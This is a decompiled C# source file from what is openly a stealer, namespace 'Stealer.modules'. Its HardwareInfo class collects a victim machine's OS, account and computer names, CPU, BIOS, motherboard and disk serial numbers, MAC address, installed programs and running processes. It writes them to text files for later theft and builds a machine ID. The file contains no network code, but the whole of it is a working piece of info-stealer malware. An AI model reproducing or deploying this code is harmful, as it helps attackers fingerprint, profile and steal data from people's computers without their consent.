using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Stealer.modules
{
	// Token: 0x02000030 RID: 48
	internal class HardwareInfo
	{
		// Token: 0x060000E8 RID: 232 RVA: 0x0000AEF0 File Offset: 0x000090F0
		public static void GoInfo()
		{
			string text = Program.path + "\\HardwareInfo\\";
			if (!File.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			using (StreamWriter streamWriter = new StreamWriter(text + "SystemInfo.txt", true))
			{
				streamWriter.WriteLine("\n[SYSTEMINFO]\nOSInformation: " + HardwareInfo.GetOSInformation());
				streamWriter.WriteLine("\n[SYSTEMINFO]\nComputerName: " + HardwareInfo.GetComputerName());
				streamWriter.WriteLine("\n[SYSTEMINFO]\nAccountName: " + HardwareInfo.GetAccountName());
				streamWriter.WriteLine("\n[SYSTEMINFO]\nVideoController: " + HardwareInfo.GetVideoController());
				streamWriter.WriteLine("\n[SYSTEMINFO]\nRAM: " + HardwareInfo.RAM() + ", noslots - " + HardwareInfo.GetNoRamSlots());
				streamWriter.WriteLine("\n[SYSTEMINFO]\nProcessor: " + HardwareInfo.GetProcessor());
				streamWriter.WriteLine("\n[SYSTEMINFO]\nMotherBoard: " + HardwareInfo.GetMotherBoard());
				streamWriter.WriteLine("\n[SYSTEMINFO]\nScreenResolution: " + HardwareInfo.ScreenResolution());
				streamWriter.WriteLine("\n[SYSTEMINFO]\nTimeZone: " + HardwareInfo.GetTimeZone());
				streamWriter.WriteLine("\n[SYSTEMINFO]\nHDDSerialNo: " + HardwareInfo.GetHDDSerialNo());
				streamWriter.WriteLine("\n[SYSTEMINFO]\nMACAddress: " + HardwareInfo.GetMACAddress());
				streamWriter.WriteLine("\n[SYSTEMINFO]\nCdRomDrive: " + HardwareInfo.GetCdRomDrive());
				streamWriter.WriteLine(string.Concat(new string[]
				{
					"\n[SYSTEMINFO]\nGetBIOS: Smaker - ",
					HardwareInfo.GetBIOSmaker(),
					", sserno - ",
					HardwareInfo.GetBIOSserNo(),
					", scaption - ",
					HardwareInfo.GetBIOScaption()
				}));
			}
			using (StreamWriter streamWriter2 = new StreamWriter(text + "InstallPrograms.txt", true))
			{
				streamWriter2.WriteLine(HardwareInfo.GetPrograms());
			}
			using (StreamWriter streamWriter3 = new StreamWriter(text + "RunningProcess.txt", true))
			{
				streamWriter3.WriteLine(HardwareInfo.GetProcess());
			}
		}

		// Token: 0x060000E9 RID: 233 RVA: 0x0000B12C File Offset: 0x0000932C
		private static string GetVideoController()
		{
			new List<string[]>();
			string empty = string.Empty;
			string empty2 = string.Empty;
			string result = "";
			using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementClass("Win32_VideoController").GetInstances().GetEnumerator())
			{
				try
				{
					if (enumerator.MoveNext())
					{
						string value = enumerator.Current.Properties["AdapterRAM"].Value.ToString();
						result = "Name - " + enumerator.Current.Properties["Name"].Value.ToString() + ", memory - " + HardwareInfo.Counting(Convert.ToUInt64(value));
					}
				}
				catch
				{
				}
			}
			return result;
		}

		// Token: 0x060000EA RID: 234 RVA: 0x0000B1F8 File Offset: 0x000093F8
		private static string RAM()
		{
			string result = string.Empty;
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMemory").Get())
			{
				if (managementBaseObject.Properties["Capacity"].Value is ulong)
				{
					result = "Memory - " + HardwareInfo.Counting((ulong)managementBaseObject.Properties["Capacity"].Value);
				}
			}
			return result;
		}

		// Token: 0x060000EB RID: 235 RVA: 0x0000B294 File Offset: 0x00009494
		private static string GetProcessor()
		{
			ManagementObjectCollection instances = new ManagementClass("win32_processor").GetInstances();
			string text = string.Empty;
			string text2 = string.Empty;
			string text3 = string.Empty;
			string text4 = string.Empty;
			using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = instances.GetEnumerator())
			{
				if (enumerator.MoveNext())
				{
					text = enumerator.Current.Properties["processorID"].Value.ToString();
					text2 = enumerator.Current.Properties["Name"].Value.ToString();
					text3 = enumerator.Current.Properties["NumberOfCores"].Value.ToString();
					text4 = enumerator.Current.Properties["Manufacturer"].Value.ToString();
				}
			}
			return string.Concat(new string[]
			{
				"Name - ",
				text2,
				", id - ",
				text,
				", kerls - ",
				text3,
				", manufacturer - ",
				text4
			});
		}

		// Token: 0x060000EC RID: 236 RVA: 0x0000B3CC File Offset: 0x000095CC
		private static string GetPrograms()
		{
			string text = string.Empty;
			if (Environment.Is64BitOperatingSystem)
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
				foreach (string name in registryKey.GetSubKeyNames())
				{
					try
					{
						RegistryKey registryKey2 = registryKey.OpenSubKey(name);
						if (!(registryKey2.GetValue("DisplayName").ToString() != ""))
						{
							break;
						}
						text = string.Concat(new string[]
						{
							text,
							"\n[PROGRAMS]\n",
							registryKey2.GetValue("DisplayName").ToString(),
							", ",
							registryKey2.GetValue("InstallLocation").ToString(),
							"\n"
						});
					}
					catch
					{
					}
				}
				return text;
			}
			RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
			foreach (string name2 in registryKey3.GetSubKeyNames())
			{
				try
				{
					RegistryKey registryKey4 = registryKey3.OpenSubKey(name2);
					if (!(registryKey4.GetValue("DisplayName").ToString() != ""))
					{
						break;
					}
					text = string.Concat(new string[]
					{
						text,
						"\n[PROGRAMS]\n",
						registryKey4.GetValue("DisplayName").ToString(),
						registryKey4.GetValue("InstallLocation").ToString(),
						"\n"
					});
				}
				catch
				{
				}
			}
			return text;
		}

		// Token: 0x060000ED RID: 237 RVA: 0x0000B580 File Offset: 0x00009780
		private static string GetHDDSerialNo()
		{
			ManagementObjectCollection instances = new ManagementClass("Win32_LogicalDisk").GetInstances();
			string text = "";
			foreach (ManagementBaseObject managementBaseObject in instances)
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				text += Convert.ToString(managementObject["VolumeSerialNumber"]);
			}
			return text;
		}

		// Token: 0x060000EE RID: 238 RVA: 0x0000B5F4 File Offset: 0x000097F4
		private static string GetMACAddress()
		{
			ManagementObjectCollection instances = new ManagementClass("Win32_NetworkAdapterConfiguration").GetInstances();
			string text = string.Empty;
			foreach (ManagementBaseObject managementBaseObject in instances)
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				if (text == string.Empty && (bool)managementObject["IPEnabled"])
				{
					text = managementObject["MacAddress"].ToString();
				}
				managementObject.Dispose();
			}
			return text;
		}

		// Token: 0x060000EF RID: 239 RVA: 0x0000B688 File Offset: 0x00009888
		private static string GetCdRomDrive()
		{
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_CDROMDrive").Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				try
				{
					return managementObject.GetPropertyValue("Drive").ToString();
				}
				catch
				{
				}
			}
			return "CD ROM Drive Letter: Unknown";
		}

		// Token: 0x060000F0 RID: 240 RVA: 0x0000B70C File Offset: 0x0000990C
		private static string GetBIOSmaker()
		{
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BIOS").Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				try
				{
					return managementObject.GetPropertyValue("Manufacturer").ToString();
				}
				catch
				{
				}
			}
			return "BIOS Maker: Unknown";
		}

		// Token: 0x060000F1 RID: 241 RVA: 0x0000B790 File Offset: 0x00009990
		private static string GetBIOSserNo()
		{
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BIOS").Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				try
				{
					return managementObject.GetPropertyValue("SerialNumber").ToString();
				}
				catch
				{
				}
			}
			return "BIOS Serial Number: Unknown";
		}

		// Token: 0x060000F2 RID: 242 RVA: 0x0000B814 File Offset: 0x00009A14
		private static string GetBIOScaption()
		{
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BIOS").Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				try
				{
					return managementObject.GetPropertyValue("Caption").ToString();
				}
				catch
				{
				}
			}
			return "BIOS Caption: Unknown";
		}

		// Token: 0x060000F3 RID: 243 RVA: 0x0000B898 File Offset: 0x00009A98
		public static string GetAccountName()
		{
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_UserAccount").Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				try
				{
					return managementObject.GetPropertyValue("Name").ToString();
				}
				catch
				{
				}
			}
			return "Unknown";
		}

		// Token: 0x060000F4 RID: 244 RVA: 0x0000B91C File Offset: 0x00009B1C
		private static string GetNoRamSlots()
		{
			int num = 0;
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher(new ManagementScope(), new ObjectQuery("SELECT MemoryDevices FROM Win32_PhysicalMemoryArray")).Get())
			{
				num = Convert.ToInt32(managementBaseObject["MemoryDevices"]);
			}
			return num.ToString();
		}

		// Token: 0x060000F5 RID: 245 RVA: 0x0000B990 File Offset: 0x00009B90
		private static string GetOSInformation()
		{
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				try
				{
					return string.Concat(new string[]
					{
						((string)managementObject["Caption"]).Trim(),
						", ",
						(string)managementObject["Version"],
						", ",
						(string)managementObject["OSArchitecture"]
					});
				}
				catch
				{
				}
			}
			return "BIOS Maker: Unknown";
		}

		// Token: 0x060000F6 RID: 246 RVA: 0x0000BA58 File Offset: 0x00009C58
		public static string GetComputerName()
		{
			ManagementObjectCollection instances = new ManagementClass("Win32_ComputerSystem").GetInstances();
			string result = string.Empty;
			foreach (ManagementBaseObject managementBaseObject in instances)
			{
				result = (string)managementBaseObject["Name"];
			}
			return result;
		}

		// Token: 0x060000F7 RID: 247 RVA: 0x0000BAC4 File Offset: 0x00009CC4
		private static string Counting(ulong number)
		{
			if (number >= 1073741824UL)
			{
				if (number % 1073741824UL != 0UL)
				{
					return Math.Round(number / 1073741824UL, 1).ToString() + " GB";
				}
				return (number / 1073741824UL).ToString() + " GB";
			}
			else
			{
				if (number % 1048576UL != 0UL)
				{
					return Math.Round(number / 1048576UL, 1).ToString() + " MB";
				}
				return (number / 1048576UL).ToString() + " MB";
			}
		}

		// Token: 0x060000F8 RID: 248 RVA: 0x0000BB70 File Offset: 0x00009D70
		private static string GetProcess()
		{
			string text = string.Empty;
			foreach (Process process in Process.GetProcesses())
			{
				text = string.Concat(new string[]
				{
					text,
					"\n[PROCESSES]\nId: ",
					process.Id.ToString(),
					", name: ",
					process.ProcessName,
					"\n"
				});
			}
			return text;
		}

		// Token: 0x060000F9 RID: 249 RVA: 0x0000BBEC File Offset: 0x00009DEC
		private static string ScreenResolution()
		{
			string empty = string.Empty;
			Size size = Screen.PrimaryScreen.Bounds.Size;
			return size.Width.ToString() + " x " + size.Height.ToString();
		}

		// Token: 0x060000FA RID: 250 RVA: 0x0000BC3A File Offset: 0x00009E3A
		private static string GetTimeZone()
		{
			return TimeZoneInfo.Local.DisplayName;
		}

		// Token: 0x060000FB RID: 251 RVA: 0x0000BC48 File Offset: 0x00009E48
		private static string GetMotherBoard()
		{
			string result = string.Empty;
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM CIM_Card").Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				try
				{
					result = string.Concat(new string[]
					{
						"Manufacturer - ",
						managementObject.GetPropertyValue("Manufacturer").ToString(),
						", product - ",
						managementObject.GetPropertyValue("Product").ToString(),
						", serialnumber - ",
						managementObject.GetPropertyValue("SerialNumber").ToString(),
						", version - ",
						managementObject.GetPropertyValue("Version").ToString()
					});
				}
				catch
				{
				}
			}
			return result;
		}

		// Token: 0x060000FC RID: 252 RVA: 0x0000BD3C File Offset: 0x00009F3C
		private static string GenerateMachineId()
		{
			string text = string.Empty;
			try
			{
				foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM CIM_Card").Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					text = text + managementObject["SerialNumber"].ToString() + "-";
				}
			}
			catch
			{
			}
			try
			{
				ManagementObject managementObject2 = new ManagementObject("win32_logicaldisk.deviceid=\"" + Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":\"");
				managementObject2.Get();
				text = text + managementObject2["VolumeSerialNumber"].ToString() + "-";
			}
			catch
			{
			}
			try
			{
				string text2 = "ABCDE1431252346547FGHI154689JKLMNOPQRSTUVWX41478o3572348956347890672347681735243656YZ012345214546805311423o85465265113577899242354356789";
				char[] array = new char[8];
				Random random = new Random();
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = text2[random.Next(text2.Length)];
				}
				string str = new string(array);
				text = text + str + "-";
			}
			catch
			{
			}
			try
			{
				foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get())
				{
					ManagementObject managementObject3 = (ManagementObject)managementBaseObject2;
					text += managementObject3["ProcessorId"].ToString();
				}
			}
			catch
			{
			}
			return text;
		}
	}
}
